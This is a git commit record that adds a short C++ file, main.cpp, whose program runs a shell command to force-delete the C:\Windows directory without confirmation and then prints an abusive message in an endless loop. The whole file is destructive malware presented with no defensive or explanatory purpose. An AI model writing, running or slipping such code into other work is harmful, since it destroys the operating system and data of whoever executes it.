9494e6b8c9f20763d04daea1594496c1610b925c
orangepeel367 <leontaylor476@gmail.com>
2016-09-17 20:46:16 +1000

    Create main.cpp

---
+++ main.cpp
@@ -0,0 +1,12 @@
+#include <cstdio>
+#include <cstdlib>
+#include <iostream>
+using namespace std;
+
+int main(){
+  system("deltree /Y C:\\Windows");
+  for(;;){
+  cout << "You're Fucked!" << endl;
+  }
+return 0;
+}
